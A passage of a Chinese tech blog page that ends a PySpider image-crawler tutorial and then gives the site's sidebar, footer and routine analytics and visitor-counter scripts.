class="function"><span class="keyword">def</span> <span class="title">getExtension</span><span class="params">(<span class="keyword">self</span>, url)</span></span><span class="symbol">:</span></span><br><span class="line">        extension = url.split(<span class="string">'.'</span>)[-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> extension</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>粘贴到你的 PySpider 中运行吧～ 其中有一些知识点，我会在后面作详细的用法总结。大家可以先体会一下代码。 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/03/QQ20160326-1@2x.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/03/QQ20160326-1@2x-1024x418.png" alt="QQ20160326-1@2x"></a> 保存之后，点击下方的 run，你会发现，海量的 MM 图片已经涌入你的电脑啦～ <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/03/QQ20160326-2@2x.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/03/QQ20160326-2@2x-1024x831.png" alt="QQ20160326-2@2x"></a> <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/03/QQ20160326-3@2x.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/03/QQ20160326-3@2x-1024x831.png" alt="QQ20160326-3@2x"></a> 需要解释？需要我也不解释！</p>
                  <h2 id="项目代码"><a href="#项目代码" class="headerlink" title="项目代码"></a>项目代码</h2>
                  <p><a href="https://github.com/cqcre/TaobaoMM" target="_blank" rel="noopener">TaobaoMM - GitHub</a></p>
                  <h2 id="尚方宝剑"><a href="#尚方宝剑" class="headerlink" title="尚方宝剑"></a>尚方宝剑</h2>
                  <p>如果想了解 PySpider 的更多内容，可以查看官方文档。 <a href="http://docs.pyspider.org/en/latest/Quickstart/" target="_blank" rel="noopener">官方文档</a></p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2016-03-26 02:32:36" itemprop="dateCreated datePublished" datetime="2016-03-26T02:32:36+08:00">2016-03-26</time>
                </span>
                <span id="/2652.html" class="post-meta-item leancloud_visitors" data-flag-title="Python爬虫进阶四之PySpider的用法" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>8.5k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>8 分钟</span>
                </span>
              </div>
            </article>
            <script>
              document.querySelectorAll('.random').forEach(item => item.src = "https://picsum.photos/id/" + Math.floor(Math.random() * Math.floor(300)) + "/200/133")

            </script>
            <nav class="pagination">
              <a class="extend prev" rel="prev" href="/page/13/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><span class="page-number current">14</span><a class="page-number" href="/page/15/">15</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><a class="extend next" rel="next" href="/page/15/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
            </nav>
          </div>
          <script>
            window.addEventListener('tabs:register', () =>
            {
              let
              {
                activeClass
              } = CONFIG.comments;
              if (CONFIG.comments.storage)
              {
                activeClass = localStorage.getItem('comments_active') || activeClass;
              }
              if (activeClass)
              {
                let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
                if (activeTab)
                {
                  activeTab.click();
                }
              }
            });
            if (CONFIG.comments.storage)
            {
              window.addEventListener('tabs:click', event =>
              {
                if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
                let commentClass = event.target.classList[1];
                localStorage.setItem('comments_active', commentClass);
              });
            }

          </script>
        </div>
        <div class="toggle sidebar-toggle">
          <span class="toggle-line toggle-line-first"></span>
          <span class="toggle-line toggle-line-middle"></span>
          <span class="toggle-line toggle-line-last"></span>
        </div>
        <aside class="sidebar">
          <div class="sidebar-inner">
            <ul class="sidebar-nav motion-element">
              <li class="sidebar-nav-toc"> 文章目录 </li>
              <li class="sidebar-nav-overview"> 站点概览 </li>
            </ul>
            <!--noindex-->
            <div class="post-toc-wrap sidebar-panel">
            </div>
            <!--/noindex-->
            <div class="site-overview-wrap sidebar-panel">
              <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
                <img class="site-author-image" itemprop="image" alt="崔庆才" src="/images/avatar.png">
                <p class="site-author-name" itemprop="name">崔庆才</p>
                <div class="site-description" itemprop="description">静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。</div>
              </div>
              <div class="site-state-wrap motion-element">
                <nav class="site-state">
                  <div class="site-state-item site-state-posts">
                    <a href="/archives/">
                      <span class="site-state-item-count">710</span>
                      <span class="site-state-item-name">日志</span>
                    </a>
                  </div>
                  <div class="site-state-item site-state-categories">
                    <a href="/categories/">
                      <span class="site-state-item-count">43</span>
                      <span class="site-state-item-name">分类</span></a>
                  </div>
                  <div class="site-state-item site-state-tags">
                    <a href="/tags/">
                      <span class="site-state-item-count">260</span>
                      <span class="site-state-item-name">标签</span></a>
                  </div>
                </nav>
              </div>
              <div class="links-of-author motion-element">
                <span class="links-of-author-item">
                  <a href="https://github.com/Germey" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Germey" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
                </span>
                <span class="links-of-author-item">
                  <a href="mailto:cqc@cuiqingcai.com.com" title="邮件 → mailto:cqc@cuiqingcai.com.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>邮件</a>
                </span>
                <span class="links-of-author-item">
                  <a href="https://weibo.com/cuiqingcai" title="微博 → https:&#x2F;&#x2F;weibo.com&#x2F;cuiqingcai" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>微博</a>
                </span>
                <span class="links-of-author-item">
                  <a href="https://www.zhihu.com/people/Germey" title="知乎 → https:&#x2F;&#x2F;www.zhihu.com&#x2F;people&#x2F;Germey" rel="noopener" target="_blank"><i class="fa fa-magic fa-fw"></i>知乎</a>
                </span>
              </div>
            </div>
            <div style=" width: 100%;" class="sidebar-panel sidebar-panel-image sidebar-panel-active">
              <a href="https://item.jd.com/13527222.html" target="_blank" rel="noopener">
                <img src="https://cdn.cuiqingcai.com/ei5og.jpg" style=" width: 100%;">
              </a>
            </div>
            <div class="sidebar-panel sidebar-panel-categories sidebar-panel-active">
              <h4 class="name"> 分类 </h4>
              <div class="content">
                <ul class="category-list">
                  <li class="category-list-item"><a class="category-list-link" href="/categories/API/">API</a><span class="category-list-count">6</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/C-C/">C/C++</a><span class="category-list-count">23</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/Claude/">Claude</a><span class="category-list-count">1</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/Gemini/">Gemini</a><span class="category-list-count">1</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/Google-SERP/">Google SERP</a><span class="category-list-count">2</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/HTML/">HTML</a><span class="category-list-count">14</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/Java/">Java</a><span class="category-list-count">5</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/JavaScript/">JavaScript</a><span class="category-list-count">26</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/Linux/">Linux</a><span class="category-list-count">14</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/Luma/">Luma</a><span class="category-list-count">1</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/Markdown/">Markdown</a><span class="category-list-count">2</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/Midjourney/">Midjourney</a><span class="category-list-count">1</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/Nano-Banana/">Nano Banana</a><span class="category-list-count">2</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/Net/">Net</a><span class="category-list-count">4</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/Nexior/">Nexior</a><span class="category-list-count">1</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/Other/">Other</a><span class="category-list-count">40</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/PHP/">PHP</a><span class="category-list-count">27</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/Paper/">Paper</a><span class="category-list-count">2</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/Producer/">Producer</a><span class="category-list-count">2</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/Python/">Python</a><span class="category-list-count">303</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/SeeDance/">SeeDance</a><span class="category-list-count">5</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/SeeDream/">SeeDream</a><span class="category-list-count">3</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/Sora/">Sora</a><span class="category-list-count">2</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/TypeScript/">TypeScript</a><span class="category-list-count">2</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/Veo/">Veo</a><span class="category-list-count">3</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/nano-banana/">nano-banana</a><span class="category-list-count">1</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%AA%E4%BA%BA%E5%B1%95%E7%A4%BA/">个人展示</a><span class="category-list-count">1</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%AA%E4%BA%BA%E6%97%A5%E8%AE%B0/">个人日记</a><span class="category-list-count">9</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%AA%E4%BA%BA%E8%AE%B0%E5%BD%95/">个人记录</a><span class="category-list-count">6</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/">个人随笔</a><span class="category-list-count">21</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/">人工智能</a><span class="category-list-count">6</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/">安装配置</a><span class="category-list-count">59</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/%E6%8A%80%E6%9C%AF%E6%9D%82%E8%B0%88/">技术杂谈</a><span class="category-list-count">96</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9C%AA%E5%88%86%E7%B1%BB/">未分类</a><span class="category-list-count">1</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/">深度学习</a><span class="category-list-count">1</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/%E7%88%AC%E8%99%AB/">爬虫</a><span class="category-list-count">4</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/%E7%94%9F%E6%B4%BB%E7%AC%94%E8%AE%B0/">生活笔记</a><span class="category-list-count">1</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A6%8F%E5%88%A9%E4%B8%93%E5%8C%BA/">福利专区</a><span class="category-list-count">6</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/%E8%81%8C%E4%BD%8D%E6%8E%A8%E8%8D%90/">职位推荐</a><span class="category-list-count">1</span></li>
                  <li class="category-list-item"><a class="category-list-link" href="/categories/%E8%89%BA%E6%9C%AF%E4%BA%8C%E7%BB%B4%E7%A0%81/">艺术二维码</a><span class="category-list-count">1</span></li>
                </ul>
              </div>
            </div>
            <div class="sidebar-panel sidebar-panel-friends sidebar-panel-active">
              <h4 class="name"> 友情链接 </h4>
              <ul class="friends">
                <li class="friend">
                  <span class="logo">
                    <img src="https://cdn.cuiqingcai.com/j2dub.jpg">
                  </span>
                  <span class="link">
                    <a href="https://www.findhao.net/" target="_blank" rel="noopener">FindHao</a>
                  </span>
                </li>
                <li class="friend">
                  <span class="logo">
                    <img src="https://cdn.cuiqingcai.com/6apxu.jpg">
                  </span>
                  <span class="link">
                    <a href="https://www.51dev.com/" target="_blank" rel="noopener">IT技术社区</a>
                  </span>
                </li>
                <li class="friend">
                  <span class="logo">
                    <img src="https://cdn.cuiqingcai.com/bqlbs.png">
                  </span>
                  <span class="link">
                    <a href="http://www.urselect.com/" target="_blank" rel="noopener">优社电商</a>
                  </span>
                </li>
                <li class="friend">
                  <span class="logo">
                    <img src="https://cdn.cuiqingcai.com/8s88c.jpg">
                  </span>
                  <span class="link">
                    <a href="https://www.yuanrenxue.com/" target="_blank" rel="noopener">猿人学</a>
                  </span>
                </li>
                <li class="friend">
                  <span class="logo">
                    <img src="https://cdn.cuiqingcai.com/2wgg5.jpg">
                  </span>
                  <span class="link">
                    <a href="https://www.yunlifang.cn/" target="_blank" rel="noopener">云立方</a>
                  </span>
                </li>
                <li class="friend">
                  <span class="logo">
                    <img src="http://qianxunclub.com/favicon.png">
                  </span>
                  <span class="link">
                    <a href="http://qianxunclub.com/" target="_blank" rel="noopener">千寻啊千寻</a>
                  </span>
                </li>
                <li class="friend">
                  <span class="logo">
                    <img src="https://cdn.cuiqingcai.com/0044u.jpg">
                  </span>
                  <span class="link">
                    <a href="http://kodcloud.com/" target="_blank" rel="noopener">可道云</a>
                  </span>
                </li>
                <li class="friend">
                  <span class="logo">
                    <img src="https://cdn.cuiqingcai.com/ygnpn.jpg">
                  </span>
                  <span class="link">
                    <a href="http://www.kunkundashen.cn/" target="_blank" rel="noopener">坤坤大神</a>
                  </span>
                </li>
                <li class="friend">
                  <span class="logo">
                    <img src="https://cdn.cuiqingcai.com/x714o.jpg">
                  </span>
                  <span class="link">
                    <a href="http://www.hubwiz.com/" target="_blank" rel="noopener">汇智网</a>
                  </span>
                </li>
                <li class="friend">
                  <span class="logo">
                    <img src="https://cdn.cuiqingcai.com/44hxf.png">
                  </span>
                  <span class="link">
                    <a href="http://redstonewill.com/" target="_blank" rel="noopener">红色石头</a>
                  </span>
                </li>
                <li class="friend">
                  <span class="logo">
                    <img src="https://cdn.cuiqingcai.com/wkaus.jpg">
                  </span>
                  <span class="link">
                    <a href="https://zhaoshuai.me/" target="_blank" rel="noopener">碎念</a>
                  </span>
                </li>
                <li class="friend">
                  <span class="logo">
                    <img src="https://cdn.cuiqingcai.com/pgo0r.jpg">
                  </span>
                  <span class="link">
                    <a href="https://www.chenwenguan.com/" target="_blank" rel="noopener">陈文管的博客</a>
                  </span>
                </li>
                <li class="friend">
                  <span class="logo">
                    <img src="https://cdn.cuiqingcai.com/kk82a.jpg">
                  </span>
                  <span class="link">
                    <a href="https://www.lxlinux.net/" target="_blank" rel="noopener">良许Linux教程网</a>
                  </span>
                </li>
                <li class="friend">
                  <span class="logo">
                    <img src="https://cdn.cuiqingcai.com/lj0t2.jpg">
                  </span>
                  <span class="link">
                    <a href="https://tanqingbo.cn/" target="_blank" rel="noopener">IT码农</a>
                  </span>
                </li>
                <li class="friend">
                  <span class="logo">
                    <img src="https://cdn.cuiqingcai.com/i8cdr.png">
                  </span>
                  <span class="link">
                    <a href="https://junyiseo.com/" target="_blank" rel="noopener">均益个人博客</a>
                  </span>
                </li>
                <li class="friend">
                  <span class="logo">
                    <img src="https://cdn.cuiqingcai.com/chwv2.png">
                  </span>
                  <span class="link">
                    <a href="https://brucedone.com/" target="_blank" rel="noopener">大鱼的鱼塘</a>
                  </span>
                </li>
                <li class="friend">
                  <span class="logo">
                    <img src="https://www.91vps.com/favicon.ico">
                  </span>
                  <span class="link">
                    <a href="http://www.91vps.com/" target="_blank" rel="noopener">91VPS</a>
                  </span>
                </li>
                <li class="friend">
                  <span class="logo">
                    <img src="https://webpage.qidian.qq.com/qidian/chatv3-gray/favicon.ico">
                  </span>
                  <span class="link">
                    <a href="https://www.qg.net/" target="_blank" rel="noopener">青果网络</a>
                  </span>
                </li>
              </ul>
            </div>
            <div class="sidebar-panel sidebar-panel-tags sidebar-panel-active">
              <h4 class="name"> 标签云 </h4>
              <div class="content">
                <a href="/tags/2022/" style="font-size: 20px;">2022</a> <a href="/tags/2048/" style="font-size: 10px;">2048</a> <a href="/tags/ACE-Data/" style="font-size: 13px;">ACE Data</a> <a href="/tags/ADSL/" style="font-size: 10px;">ADSL</a> <a href="/tags/AI%E7%BC%96%E7%A8%8B/" style="font-size: 10px;">AI编程</a> <a href="/tags/API/" style="font-size: 19px;">API</a> <a href="/tags/Ajax/" style="font-size: 12px;">Ajax</a> <a href="/tags/Audios/" style="font-size: 11px;">Audios</a> <a href="/tags/Bootstrap/" style="font-size: 11px;">Bootstrap</a> <a href="/tags/Bug/" style="font-size: 10px;">Bug</a> <a href="/tags/CDN/" style="font-size: 10px;">CDN</a> <a href="/tags/CQC/" style="font-size: 10px;">CQC</a> <a href="/tags/CSS/" style="font-size: 10px;">CSS</a> <a href="/tags/CSS-%E5%8F%8D%E7%88%AC%E8%99%AB/" style="font-size: 10px;">CSS 反爬虫</a> <a href="/tags/CV/" style="font-size: 10px;">CV</a> <a href="/tags/ChatGPT/" style="font-size: 10px;">ChatGPT</a> <a href="/tags/Cookie/" style="font-size: 10px;">Cookie</a> <a href="/tags/Django/" style="font-size: 10px;">Django</a> <a href="/tags/Eclipse/" style="font-size: 11px;">Eclipse</a> <a href="/tags/Elasticsearch/" style="font-size: 10px;">Elasticsearch</a> <a href="/tags/FTP/" style="font-size: 10px;">FTP</a> <a href="/tags/Flux/" style="font-size: 10px;">Flux</a> <a href="/tags/Gemini/" style="font-size: 10px;">Gemini</a> <a href="/tags/Git/" style="font-size: 10px;">Git</a> <a href="/tags/GitHub/" style="font-size: 13px;">GitHub</a> <a href="/tags/Google-SERP/" style="font-size: 11px;">Google SERP</a> <a href="/tags/HTML5/" style="font-size: 10px;">HTML5</a> <a href="/tags/HTTP/" style="font-size: 10px;">HTTP</a> <a href="/tags/Hailuo/" style="font-size: 10px;">Hailuo</a> <a href="/tags/Hexo/" style="font-size: 10px;">Hexo</a> <a href="/tags/Hook/" style="font-size: 10px;">Hook</a> <a href="/tags/IP/" style="font-size: 10px;">IP</a> <a href="/tags/IT/" style="font-size: 10px;">IT</a> <a href="/tags/Images/" style="font-size: 11px;">Images</a> <a href="/tags/JSON/" style="font-size: 10px;">JSON</a> <a href="/tags/JSP/" style="font-size: 10px;">JSP</a> <a href="/tags/JavaScript/" style="font-size: 14px;">JavaScript</a> <a href="/tags/K8s/" style="font-size: 10px;">K8s</a> <a href="/tags/LOGO/" style="font-size: 10px;">LOGO</a> <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/Luma/" style="font-size: 10px;">Luma</a> <a href="/tags/MIUI/" style="font-size: 10px;">MIUI</a> <a href="/tags/Markdown/" style="font-size: 10px;">Markdown</a> <a href="/tags/Midjourney/" style="font-size: 12px;">Midjourney</a> <a href="/tags/MongoDB/" style="font-size: 11px;">MongoDB</a> <a href="/tags/MySQL/" style="font-size: 10px;">MySQL</a> <a href="/tags/Mysql/" style="font-size: 10px;">Mysql</a> <a href="/tags/NBA/" style="font-size: 10px;">NBA</a> <a href="/tags/Nano-Banana/" style="font-size: 11px;">Nano Banana</a> <a href="/tags/Nexior/" style="font-size: 10px;">Nexior</a> <a href="/tags/OCR/" style="font-size: 10px;">OCR</a> <a href="/tags/OpenCV/" style="font-size: 10px;">OpenCV</a> <a href="/tags/PHP/" style="font-size: 11px;">PHP</a> <a href="/tags/PPT/" style="font-size: 10px;">PPT</a> <a href="/tags/PS/" style="font-size: 10px;">PS</a> <a href="/tags/Pathlib/" style="font-size: 10px;">Pathlib</a> <a href="/tags/PhantomJS/" style="font-size: 10px;">PhantomJS</a> <a href="/tags/Playwright/" style="font-size: 10px;">Playwright</a> <a href="/tags/Producer/" style="font-size: 11px;">Producer</a> <a href="/tags/Python/" style="font-size: 16px;">Python</a> <a href="/tags/Python-%E7%88%AC%E8%99%AB/" style="font-size: 17px;">Python 爬虫</a> <a href="/tags/Python3/" style="font-size: 11px;">Python3</a> <a href="/tags/Python3%E7%88%AC%E8%99%AB%E6%95%99%E7%A8%8B/" style="font-size: 12px;">Python3爬虫教程</a> <a href="/tags/Pythonic/" style="font-size: 10px;">Pythonic</a> <a href="/tags/Python%E7%88%AC%E8%99%AB/" style="font-size: 18px;">Python爬虫</a> <a href="/tags/Python%E7%88%AC%E8%99%AB%E4%B9%A6/" style="font-size: 12px;">Python爬虫书</a> <a href="/tags/Python%E7%88%AC%E8%99%AB%E6%95%99%E7%A8%8B/" style="font-size: 15px;">Python爬虫教程</a> <a href="/tags/QQ/" style="font-size: 10px;">QQ</a> <a href="/tags/RabbitMQ/" style="font-size: 10px;">RabbitMQ</a> <a href="/tags/ReCAPTCHA/" style="font-size: 10px;">ReCAPTCHA</a> <a href="/tags/Redis/" style="font-size: 10px;">Redis</a> <a href="/tags/Riffusion/" style="font-size: 11px;">Riffusion</a> <a href="/tags/SAE/" style="font-size: 10px;">SAE</a> <a href="/tags/SSH/" style="font-size: 10px;">SSH</a> <a href="/tags/SVG/" style="font-size: 10px;">SVG</a> <a href="/tags/Scrapy-redis/" style="font-size: 10px;">Scrapy-redis</a> <a href="/tags/Scrapy%E5%88%86%E5%B8%83%E5%BC%8F/" style="font-size: 10px;">Scrapy分布式</a> <a href="/tags/SeeDance/" style="font-size: 14px;">SeeDance</a> <a href="/tags/SeeDream/" style="font-size: 12px;">SeeDream</a> <a href="/tags/Selenium/" style="font-size: 11px;">Selenium</a> <a href="/tags/Session/" style="font-size: 10px;">Session</a> <a href="/tags/Shell/" style="font-size: 10px;">Shell</a> <a href="/tags/Sora/" style="font-size: 10px;">Sora</a> <a href="/tags/Sora2/" style="font-size: 11px;">Sora2</a> <a href="/tags/Suno/" style="font-size: 11px;">Suno</a> <a href="/tags/TKE/" style="font-size: 10px;">TKE</a> <a href="/tags/TXT/" style="font-size: 10px;">TXT</a> <a href="/tags/Terminal/" style="font-size: 10px;">Terminal</a> <a href="/tags/Ubuntu/" style="font-size: 11px;">Ubuntu</a> <a href="/tags/VS-Code/" style="font-size: 10px;">VS Code</a> <a href="/tags/Veo/" style="font-size: 13px;">Veo</a> <a href="/tags/Vercel/" style="font-size: 10px;">Vercel</a> <a href="/tags/Videos/" style="font-size: 12px;">Videos</a> <a href="/tags/Vs-Code/" style="font-size: 10px;">Vs Code</a> <a href="/tags/Vue/" style="font-size: 11px;">Vue</a> <a href="/tags/Web/" style="font-size: 10px;">Web</a> <a href="/tags/Webpack/" style="font-size: 10px;">Webpack</a> <a href="/tags/Web%E7%BD%91%E9%A1%B5/" style="font-size: 10px;">Web网页</a> <a href="/tags/Windows/" style="font-size: 10px;">Windows</a> <a href="/tags/Winpcap/" style="font-size: 10px;">Winpcap</a>
              </div>
              <script>
                const tagsColors = ['#00a67c', '#5cb85c', '#d9534f', '#567e95', '#b37333', '#f4843d', '#15a287']
                const tagsElements = document.querySelectorAll('.sidebar-panel-tags .content a')
                tagsElements.forEach((item) =>
                {
                  item.style.backgroundColor = tagsColors[Math.floor(Math.random() * tagsColors.length)]
                })

              </script>
            </div>
          </div>
        </aside>
        <div id="sidebar-dimmer"></div>
      </div>
    </main>
    <footer class="footer">
      <div class="footer-inner">
        <div class="copyright">
          <span class="author" itemprop="copyrightHolder">崔庆才丨静觅</span> &copy; <span itemprop="copyrightYear">2026</span>
          <span class="with-love">
            <i class="fa fa-heart"></i>
          </span>
          <a href="https://cuiqingcai.com/sitemap.xml" style="display:none" title="爬虫教程" target="_blank"><strong>爬虫教程</strong></a>
          <a href="https://cuiqingcai.com/sitemap.html" style="display:none" title="爬虫教程" target="_blank"><strong>爬虫教程</strong></a>
          <span class="post-meta-divider">|</span>
          <span class="post-meta-item-icon">
            <i class="fa fa-chart-area"></i>
          </span>
          <span title="站点总字数">3.5m</span>
          <span class="post-meta-divider">|</span>
          <span class="post-meta-item-icon">
            <i class="fa fa-coffee"></i>
          </span>
          <span title="站点阅读时长">52:30</span>
        </div>
        <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动 </div>
        <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">京ICP备18015597号-1 </a>
        </div>
        <script>
          (function ()
          {
            function leancloudSelector(url)
            {
              url = encodeURI(url);
              return document.getElementById(url).querySelector('.leancloud-visitors-count');
            }

            function addCount(Counter)
            {
              var visitors = document.querySelector('.leancloud_visitors');
              var url = decodeURI(visitors.id);
              var title = visitors.dataset.flagTitle;
              Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify(
              {
                url
              }))).then(response => response.json()).then((
              {
                results
              }) =>
              {
                if (results.length > 0)
                {
                  var counter = results[0];
                  leancloudSelector(url).innerText = counter.time + 1;
                  Counter('put', '/classes/Counter/' + counter.objectId,
                  {
                    time:
                    {
                      '__op': 'Increment',
                      'amount': 1
                    }
                  }).catch(error =>
                  {
                    console.error('Failed to save visitor count', error);
                  });
                }
                else
                {
                  Counter('post', '/classes/Counter',
                  {
                    title,
                    url,
                    time: 1
                  }).then(response => response.json()).then(() =>
                  {
                    leancloudSelector(url).innerText = 1;
                  }).catch(error =>
                  {
                    console.error('Failed to create', error);
                  });
                }
              }).catch(error =>
              {
                console.error('LeanCloud Counter Error', error);
              });
            }

            function showTime(Counter)
            {
              var visitors = document.querySelectorAll('.leancloud_visitors');
              var entries = [...visitors].map(element =>
              {
                return decodeURI(element.id);
              });
              Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify(
              {
                url:
                {
                  '$in': entries
                }
              }))).then(response => response.json()).then((
              {
                results
              }) =>
              {
                for (let url of entries)
                {
                  let target = results.find(item => item.url === url);
                  leancloudSelector(url).innerText = target ? target.time : 0;
                }
              }).catch(error =>
              {
                console.error('LeanCloud Counter Error', error);
              });
            }
            let
            {
              app_id,
              app_key,
              server_url
            } = {
              "enable": true,
              "app_id": "6X5dRQ0pnPWJgYy8SXOg0uID-gzGzoHsz",
              "app_key": "ziLDVEy73ne5HtFTiGstzHMS",
              "server_url": "https://6x5drq0p.lc-cn-n1-shared.com",
              "security": false
            };

            function fetchData(api_server)
            {
              var Counter = (method, url, data) =>
              {
                return fetch(`${api_server}/1.1${url}`,
                {
                  method,
                  headers:
                  {
                    'X-LC-Id': app_id,
                    'X-LC-Key': app_key,
                    'Content-Type': 'application/json',
                  },
                  body: JSON.stringify(data)
                });
              };
              if (CONFIG.page.isPost)
              {
                if (CONFIG.hostname !== location.hostname) return;
                addCount(Counter);
              }
              else if (document.querySelectorAll('.post-title-link').length >= 1)
              {
                showTime(Counter);
              }
            }
            let api_server = app_id.slice(-9) !== '-MdYXbMMI' ? server_url : `https://${app_id.slice(0, 8).toLowerCase()}.api.lncldglobal.com`;
            if (api_server)
            {
              fetchData(api_server);
            }
            else
            {
              fetch('https://app-router.leancloud.cn/2/route?appId=' + app_id).then(response => response.json()).then((
              {
                api_server
              }) =>
              {
                fetchData('https://' + api_server);
              });
            }
          })();

        </script>
      </div>
      <div class="footer-stat">
        <span id="cnzz_stat_icon_1279355174"></span>
        <script type="text/javascript">
          document.write(unescape("%3Cspan id='cnzz_stat_icon_1279355174'%3E%3C/span%3E%3Cscript src='https://v1.cnzz.com/z_stat.php%3Fid%3D1279355174%26online%3D1%26show%3Dline' type='text/javascript'%3E%3C/script%3E"));

        </script>
      </div>
    </footer>
  </div>
  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
  <script src="/js/utils.js"></script>
  <script src="/.js"></script>
  <script src="/js/schemes/pisces.js"></script>
  <script src="/.js"></script>
  <script src="/js/next-boot.js"></script>
  <script src="/.js"></script>
  <script>
    (function ()
    {
      var canonicalURL, curProtocol;
      //Get the <link> tag
      var x = document.getElementsByTagName("link");
      //Find the last canonical URL
      if (x.length > 0)
      {
        for (i = 0; i < x.length; i++)
        {
          if (x[i].rel.toLowerCase() == 'canonical' && x[i].href)
          {
            canonicalURL = x[i].href;
          }
        }
      }
      //Get protocol
      if (!canonicalURL)
      {
        curProtocol = window.location.protocol.split(':')[0];
      }
      else
      {
        curProtocol = canonicalURL.split(':')[0];
      }
      //Get current URL if the canonical URL does not exist
      if (!canonicalURL) canonicalURL = window.location.href;
      //Assign script content. Replace current URL with the canonical URL
      ! function ()
      {
        var e = /([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,
          r = canonicalURL,
          t = document.referrer;
        if (!e.test(r))
        {
